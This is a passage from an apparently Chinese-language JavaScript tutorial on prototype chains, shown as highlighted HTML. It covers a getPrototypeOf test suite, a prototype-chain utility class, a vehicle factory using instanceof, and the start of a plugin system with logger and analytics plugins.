<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试1 - 普通对象:"</span>, <span class="hljs-title function_">myGetPrototypeOf</span>(obj1) === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试2: 数组</span>
<span class="hljs-keyword">const</span> arr = [];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试2 - 数组:"</span>, <span class="hljs-title function_">myGetPrototypeOf</span>(arr) === <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试3: 自定义对象</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"测试3 - 自定义对象:"</span>,
  <span class="hljs-title function_">myGetPrototypeOf</span>(person) === <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>
); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试4: null 原型</span>
<span class="hljs-keyword">const</span> nullProtoObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试4 - null 原型:"</span>, <span class="hljs-title function_">myGetPrototypeOf</span>(nullProtoObj)); <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 测试5: 错误情况</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-title function_">myGetPrototypeOf</span>(<span class="hljs-literal">null</span>);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试5 - null 错误:"</span>, error.<span class="hljs-property">message</span>); <span class="hljs-comment">// Cannot convert undefined or null to object</span>
}
</code></pre>
<h5 data-id="heading-22">6.3 实现完整的原型链检测工具</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 原型链检测工具类
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PrototypeChainUtils</span> {
  <span class="hljs-comment">/**
   * 获取对象的完整原型链
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} obj 要检测的对象
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Array</span>} 原型链数组
   */</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getPrototypeChain</span>(<span class="hljs-params">obj</span>) {
    <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || obj === <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Cannot convert undefined or null to object"</span>);
    }

    <span class="hljs-keyword">const</span> chain = [];
    <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);

    <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
      chain.<span class="hljs-title function_">push</span>(proto);
      proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
    }

    <span class="hljs-keyword">return</span> chain;
  }

  <span class="hljs-comment">/**
   * 检查对象是否在原型链上
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} obj 要检查的对象
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} target 目标原型
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>} 是否在原型链上
   */</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">isInPrototypeChain</span>(<span class="hljs-params">obj, target</span>) {
    <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || obj === <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);

    <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">if</span> (proto === target) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
      }
      proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }

  <span class="hljs-comment">/**
   * 获取对象到指定原型的距离
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} obj 对象
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} target 目标原型
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} 距离(-1 表示不再原型链上)
   */</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDistanceToPrototype</span>(<span class="hljs-params">obj, target</span>) {
    <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || obj === <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    }

    <span class="hljs-keyword">let</span> distance = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj);

    <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">if</span> (proto === target) {
        <span class="hljs-keyword">return</span> distance;
      }
      distance++;
      proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
    }

    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
  }
}

<span class="hljs-comment">// 测试原型链工具</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 测试 PrototypeChainUtils ==="</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">C</span>(<span class="hljs-params"/>) {}

B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(A.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = B;

C.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
C.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = C;

<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title function_">C</span>();

<span class="hljs-comment">// 获取原型链</span>
<span class="hljs-keyword">const</span> chain = <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">getPrototypeChain</span>(c);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"原型链:"</span>, chain);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"原型链长度:"</span>, chain.<span class="hljs-property">length</span>); <span class="hljs-comment">// 4</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"包含 C.prototype:"</span>, chain[<span class="hljs-number">0</span>] === C.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"包含 B.prototype:"</span>, chain[<span class="hljs-number">1</span>] === B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"包含 A.prototype:"</span>, chain[<span class="hljs-number">2</span>] === A.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"包含 Object.prototype:"</span>, chain[<span class="hljs-number">3</span>] === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 检查是否在原型链上</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"是否在原型链上 - C.prototype:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">isInPrototypeChain</span>(c, C.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"是否在原型链上 - B.prototype:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">isInPrototypeChain</span>(c, B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"是否在原型链上 - A.prototype:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">isInPrototypeChain</span>(c, A.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"是否在原型链上 - Object.prototype:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">isInPrototypeChain</span>(c, <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"是否在原型链上 - 不存在的原型:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">isInPrototypeChain</span>(c, <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 获取距离</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"到 C.prototype 的距离:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">getDistanceToPrototype</span>(c, C.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// 0</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"到 B.prototype 的距离:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">getDistanceToPrototype</span>(c, B.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"到 A.prototype 的距离:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">getDistanceToPrototype</span>(c, A.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// 2</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"到 Object.prototype 的距离:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">getDistanceToPrototype</span>(c, <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// 3</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"到不存在的原型的距离:"</span>,
  <span class="hljs-title class_">PrototypeChainUtils</span>.<span class="hljs-title function_">getDistanceToPrototype</span>(c, <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)
); <span class="hljs-comment">// -1</span>

</code></pre>
<h4 data-id="heading-23">七、实际应用场景</h4>
<h5 data-id="heading-24">7.1 实现工厂模式</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用 new 和 instanceof 实现工厂模式</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">VehicleFactory</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">createVehicle</span>(<span class="hljs-params">type, options</span>) {
        <span class="hljs-keyword">switch</span> (type) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">'car'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(options);
            <span class="hljs-keyword">case</span> <span class="hljs-string">'truck'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Truck</span>(options);
            <span class="hljs-keyword">case</span> <span class="hljs-string">'motorcycle'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Motorcycle</span>(options);
            <span class="hljs-attr">default</span>:
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Unknown vehicle type: <span class="hljs-subst">${type}</span>`</span>);
        }
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">validateVehicle</span>(<span class="hljs-params">vehicle</span>) {
        <span class="hljs-keyword">if</span> (!(vehicle <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Vehicle</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Invalid vehicle'</span>);
        }
        <span class="hljs-keyword">return</span> vehicle;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">make, model, year</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">make</span> = make;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">model</span> = model;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">year</span> = year;
    }
    
    <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.year}</span> <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.make}</span> <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.model}</span>`</span>;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Vehicle</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) {
        <span class="hljs-variable language_">super</span>(options.<span class="hljs-property">make</span>, options.<span class="hljs-property">model</span>, options.<span class="hljs-property">year</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">doors</span> = options.<span class="hljs-property">doors</span> || <span class="hljs-number">4</span>;
    }
    
    <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">super</span>.getInfo()}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.doors}</span> doors)`</span>;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Truck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Vehicle</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) {
        <span class="hljs-variable language_">super</span>(options.<span class="hljs-property">make</span>, options.<span class="hljs-property">model</span>, options.<span class="hljs-property">year</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">payload</span> = options.<span class="hljs-property">payload</span> || <span class="hljs-string">'1 ton'</span>;
    }
    
    <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">super</span>.getInfo()}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.payload}</span> payload)`</span>;
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Motorcycle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Vehicle</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) {
        <span class="hljs-variable language_">super</span>(options.<span class="hljs-property">make</span>, options.<span class="hljs-property">model</span>, options.<span class="hljs-property">year</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = options.<span class="hljs-property">type</span> || <span class="hljs-string">'street'</span>;
    }
    
    <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">super</span>.getInfo()}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.type}</span> motorcycle)`</span>;
    }
}

<span class="hljs-comment">// 使用工厂模式</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 工厂模式测试 ==='</span>);

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> car = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-string">'car'</span>, {
        <span class="hljs-attr">make</span>: <span class="hljs-string">'Toyota'</span>,
        <span class="hljs-attr">model</span>: <span class="hljs-string">'Camry'</span>,
        <span class="hljs-attr">year</span>: <span class="hljs-number">2022</span>,
        <span class="hljs-attr">doors</span>: <span class="hljs-number">4</span>
    });
    
    <span class="hljs-keyword">const</span> truck = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-string">'truck'</span>, {
        <span class="hljs-attr">make</span>: <span class="hljs-string">'Ford'</span>,
        <span class="hljs-attr">model</span>: <span class="hljs-string">'F-150'</span>,
        <span class="hljs-attr">year</span>: <span class="hljs-number">2021</span>,
        <span class="hljs-attr">payload</span>: <span class="hljs-string">'2 tons'</span>
    });
    
    <span class="hljs-keyword">const</span> motorcycle = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-string">'motorcycle'</span>, {
        <span class="hljs-attr">make</span>: <span class="hljs-string">'Harley-Davidson'</span>,
        <span class="hljs-attr">model</span>: <span class="hljs-string">'Sportster'</span>,
        <span class="hljs-attr">year</span>: <span class="hljs-number">2020</span>,
        <span class="hljs-attr">type</span>: <span class="hljs-string">'cruiser'</span>
    });
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Car:'</span>, car.<span class="hljs-title function_">getInfo</span>());
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Truck:'</span>, truck.<span class="hljs-title function_">getInfo</span>());
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Motorcycle:'</span>, motorcycle.<span class="hljs-title function_">getInfo</span>());
    
    <span class="hljs-comment">// 验证</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Car instanceof Vehicle:'</span>, <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">validateVehicle</span>(car) <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Vehicle</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Car instanceof Car:'</span>, car <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Car</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Truck instanceof Vehicle:'</span>, truck <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Vehicle</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Motorcycle instanceof Vehicle:'</span>, motorcycle <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Vehicle</span>);
    
    <span class="hljs-comment">// 错误测试</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-string">'airplane'</span>, {});
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'错误处理:'</span>, error.<span class="hljs-property">message</span>);
    }
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">validateVehicle</span>({});
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'验证错误:'</span>, error.<span class="hljs-property">message</span>);
    }
} <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'工厂模式错误:'</span>, error);
}
</code></pre>
<h5 data-id="heading-25">7.2 实现插件系统</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用原型链实现插件系统</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PluginSystem</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    }
    
    <span class="hljs-comment">// 注册插件</span>
    <span class="hljs-title function_">register</span>(<span class="hljs-params">plugin</span>) {
        <span class="hljs-keyword">if</span> (!(plugin <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Plugin</span>)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Plugin must be an instance of Plugin'</span>);
        }
        
        <span class="hljs-keyword">const</span> name = plugin.<span class="hljs-property">name</span>;
        
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">has</span>(name)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Plugin "<span class="hljs-subst">${name}</span>" is already registered`</span>);
        }
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">set</span>(name, plugin);
        
        <span class="hljs-comment">// 注册钩子</span>
        <span class="hljs-keyword">if</span> (plugin.<span class="hljs-property">hooks</span>) {
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [hookName, handler] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(plugin.<span class="hljs-property">hooks</span>)) {
                <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>.<span class="hljs-title function_">has</span>(hookName)) {
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>.<span class="hljs-title function_">set</span>(hookName, []);
                }
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>.<span class="hljs-title function_">get</span>(hookName).<span class="hljs-title function_">push</span>(handler);
            }
        }
        
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Plugin "<span class="hljs-subst">${name}</span>" registered successfully`</span>);
    }
    
    <span class="hljs-comment">// 触发钩子</span>
    <span class="hljs-title function_">trigger</span>(<span class="hljs-params">hookName, ...args</span>) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>.<span class="hljs-title function_">has</span>(hookName)) {
            <span class="hljs-keyword">return</span> [];
        }
        
        <span class="hljs-keyword">const</span> results = [];
        <span class="hljs-keyword">const</span> handlers = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span>.<span class="hljs-title function_">get</span>(hookName);
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> handler <span class="hljs-keyword">of</span> handlers) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">handler</span>(...args);
                results.<span class="hljs-title function_">push</span>(result);
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error in hook "<span class="hljs-subst">${hookName}</span>":`</span>, error);
            }
        }
        
        <span class="hljs-keyword">return</span> results;
    }
    
    <span class="hljs-comment">// 获取插件</span>
    <span class="hljs-title function_">getPlugin</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">get</span>(name);
    }
    
    <span class="hljs-comment">// 检查插件是否已注册</span>
    <span class="hljs-title function_">hasPlugin</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">has</span>(name);
    }
}

<span class="hljs-comment">// 插件基类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Plugin</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span>.<span class="hljs-property">target</span> === <span class="hljs-title class_">Plugin</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Cannot instantiate Plugin directly'</span>);
        }
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span> = {};
    }
    
    <span class="hljs-comment">// 初始化钩子</span>
    <span class="hljs-title function_">init</span>(<span class="hljs-params">system</span>) {
        <span class="hljs-comment">// 由子类实现</span>
    }
}

<span class="hljs-comment">// 示例插件</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggerPlugin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Plugin</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">super</span>(<span class="hljs-string">'logger'</span>);
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span> = {
            <span class="hljs-string">'beforeRequest'</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeRequest</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
            <span class="hljs-string">'afterResponse'</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">afterResponse</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>),
            <span class="hljs-string">'onError'</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">onError</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>)
        };
    }
    
    <span class="hljs-title function_">beforeRequest</span>(<span class="hljs-params">request</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Logger] Request started: <span class="hljs-subst">${request.url}</span>`</span>);
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">logged</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() };
    }
    
    <span class="hljs-title function_">afterResponse</span>(<span class="hljs-params">response</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Logger] Response received: <span class="hljs-subst">${response.status}</span>`</span>);
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">logged</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() };
    }
    
    <span class="hljs-title function_">onError</span>(<span class="hljs-params">error</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`[Logger] Error: <span class="hljs-subst">${error.message}</span>`</span>);
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">logged</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() };
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AnalyticsPlugin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Plugin</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">super</span>(<span class="hljs-string">'analytics'</span>);
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">hooks</span> = {
            <span class="hljs-string">'afterResponse'</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">trackAnalytics</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>)
        };
        
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">requests</span> = [];
    }
    
    <span class="hljs-title function_">trackAnalytics</span>(<span class="hljs-params">response</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">requests</span>.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">url</span>: response.<span class="hljs-property">url</span>,
